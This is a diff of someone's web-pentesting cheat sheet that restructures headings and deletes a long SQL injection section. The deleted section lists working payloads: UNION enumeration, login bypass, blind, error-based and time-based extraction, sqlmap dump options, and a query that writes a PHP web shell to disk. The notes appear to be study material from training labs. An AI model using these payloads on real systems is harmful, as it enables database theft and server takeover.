@@ -1,13 +1,33 @@
+- [Server Side Template Injection](#server-side-template-injection)
+- [DNS - Subdmain](#dns---subdmain)
+  - [Wildcards](#wildcards)
+- [IDOR](#idor)
+- [File inclusion](#file-inclusion)
+- [SSRF](#ssrf)
+- [XSS](#xss)
+- [Websocket](#websocket)
+- [Command injection](#command-injection)
+- [Authentication](#authentication)
+- [SQL Injections](#sql-injections)
+  - [Steps](#steps)
+  - [UNION](#union)
+    - [Find data oracle](#find-data-oracle)
+  - [blind](#blind)
+    - [binary](#binary)
+      - [sqlmap](#sqlmap)
+      - [Provoking errors](#provoking-errors)
+    - [Time](#time)
 - [Burpsuite](#burpsuite)
   - [Repeater](#repeater)
   - [Intruder](#intruder)
-    - [Macros](#macros)
+  - [Macros](#macros)
   - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)
-  - [Wordpres](#wordpres)
+- [Wordpres](#wordpres)
 - [API](#api)
-  - [Git Enumeration](#git-enumeration)
-  - [PHP psy shell](#php-psy-shell)
-  - [PHP exec](#php-exec)
+- [Git Enumeration](#git-enumeration)
+- [PHP psy shell](#php-psy-shell)
+- [PHP exec](#php-exec)
+
 
 ## Server Side Template Injection
 {{7x7}}
@@ -105,155 +125,18 @@ Insecure Direct Object Request
   - enumerate username until valid one ==> NULL payload for password + several tries until get different response
   - try password with these usernames ==> grep warning for incorrect passwords
 
-## SQL Injections
-
-### Steps
-- Insert code, if not crash = injection
-  - parameter=value' 
-  - parameter=value' ORDER BY [#_columns] = try/error
-- find total columns: UNION SELECT NULL,NULL,NULL
-- find name of db: UNION SELECT NULL,NULL,database()
-- find tables: UNION SELECT NULL,NULL,table_name from **information_schema.tables** WHERE table_schema = 'DB name'
-- find columns in table: UNION SELECT NULL,NULL,column_name FROM **information_schema.columns** WHERE table_name= 'Table name'
-- find data: UNION SELECT NULL,NULL,group_concat(column,column,column) from table_nae
-
-- Column_name known
-  - aa' field=(COMMAND),field='
-
-- Bypass login: 
-  - admin'-- [everything here is a comment and will be ignored]
-  - or 1 = 1'-- ==> will always return true
-  - header:  X-Forwarded-For: IP
-  
-- Write file
-  - SELECT "<?php system($_GET['cmd']); ?>" into outfile "PATH/TO/SQL"
-
-### UNION
-- join two or more tables + number o columns and data type muss be equal
-- 'UNION SELECT NULL,NULL...-- - ==> until success to find number of columns
-  - NULL = compatible with all data type
-- 'UNION SELECT column1,column2 FROM table_name-- -
-- find db = '0 union 1,2,database()-- -
-- find tables = '0 union select  1,2,group_concat(table_name) FROM information_schema.tables where table_schema='db_name'
-  -  information_schema = info about all databases and tables
-- find columns: 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name'-- -
-- content: '0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
-
-- SQLITE 
-  - exist vuln: ' UNION SELECT 1,2'
-  - find tables: ' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT LIKE 'sqlite_%''
-  - find columns: ' UNION SELECT 1,group_concat(column_name) FROM table_name '
-  - find content: ' UNION SELECT 1,group_concat(column1 || '-' || column2) FROM table_name '
-  
-- Find version (always UNION)
-  - Microsoft, MySQL	SELECT @@version
-  - Oracle	SELECT * FROM v$version
-  - PostgreSQL	SELECT version()
-
-#### Find data oracle
-Oracle DB: '+UNION+SELECT+NULL,NULL+FROM+v$version--
-2 Columns strings: '+UNION+SELECT+'abc','abc'+FROM+v$version--
-Show tables: '+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 
-Show columns: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='table_name'
-Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table-- 
-
-### blind
-- Change SQL Command in the trackinID + test
-- Table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a;
-- Size of string: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;==> payload type number to find 1 until n
-  - admin' AND length((SELECT password from users where username='admin'))==37-- -
-  
-- Getting data string per string:
-  - SELECT column FROM table_name LIMIT 0,1-- - //
-    - LIMIT start,from_total ==> LIMIT 0,1 = first, from total 1 || LIMIT 0,2 start 0 from total 2
-  - SUBSTRING((SELECT column FROM table_name LIMIT 0,1)0,1)
-
-#### binary
-- like a% = starting with a
-- Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
-- Find table name: ' UNION SELECT NULL,NULL,NULL FROM information_schema.tables WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
-- find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
-- find columns 2: ' UNION SELECT NULL,NULL,[sleep(4)]|NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
-- find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--
-
-- individual charachter + size
-  - ' AND (SELECT 'a' FROM [table]  WHERE [column]='value' AND LENGTH(value)>§1§)='a;==> payload type number to find 1 until n
-  -(SQLITE): [known_value]' AND length((SELECT [column] FROM [table] WHERE [column]='value'))==37-- -
- - find substring SQLITE: admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
- 
- ##### sqlmap
-- sqlmap
-  - -u = url
-  - --data="id=123&password=123"
-  - --level 2  
-  - --risk 5
-  - --dbms=type of db
-  - --technique=???
-  - --dumb = output all databases
-  - --dbs = dhow databases
-  - -D DATABASE
-  - --tables
-  - --dbms=DATA_BASE_TYPE
-  - -r /path/to/file
-
-- Table found:
-  - --method=METHOD
-  - -D Database_Name
-  - --tables / -T
-  - --columns
-  - --dump-all
-
-##### Provoking errors
-- Oracle
-  - xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
-    - case = false  ==> no error produced
-    - TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = FALSE ==> execute after ELSE query
-      - Condition = TRUE ==> forced error 1/0
-      - Condition = FALSE ==> goes to 2nd question and asks if the info about the db is correct
-
-  - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
-    - case = true ==> error will be produced
-    - TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = TRUE ==> produce error that is processed by the query
-
-#### Time
-- with sleep() ==> success if the function is executed
-- admin123' UNION SELECT SLEEP(5),1,x,y,z;--
-- similar to blind
-- admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
-  
-- Microsoft: 
- - '; IF (1=2) WAITFOR DELAY '0:0:10'-- = false, will springt action
- - '; IF (1=1) WAITFOR DELAY '0:0:10'-- = true, action
-
-- PostgreSQL:
-  - ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
-
-- in the intruder: substring method with password list
-' AND (SELECT SUBSTRING(password,X,1) FROM users WHERE username = 'administrator')='§a§;
- - SUBSTRING(string, start, length)
- - Cluster Bomb: several $payload$, one for the position_number, one for the string
- - Brute_force: iterate over given list
-
-- Known table, columns:
-  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where *column* like '[character]%';--
-  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where username='[name]' and password like 'a%';--
-
-admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
-admin123' UNION SELECT SLEEP(5),2;--
-
-# Burpsuite
+## Burpsuite
 
 ```
 # Python code
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
-
 ```
 
-## Repeater
+### Repeater
 - manipulate the request
 - check response
 - 
-## Intruder
+### Intruder
 - brute force and fuzzing
 - Positions: where to insert payload
 - Attack types 
@@ -276,7 +159,7 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 - project options + add + selection action to be done
 - Session handling rule: select macro + select where to do it (intruder, repeater, target) + update only "name of the field", 
 
-## Decoder, Comparer, Sequencer
+### Decoder, Comparer, Sequencer
 - Decoder
   - Encode e decode data
   - hashsums, ASCII, binary, hexa, etc
@@ -307,9 +190,8 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
   - -U username
   - -P password
   - --url
--
 
-# API
+## API
 - Identify response to different methods
 - Fuzzing hidden endpoints
 - 
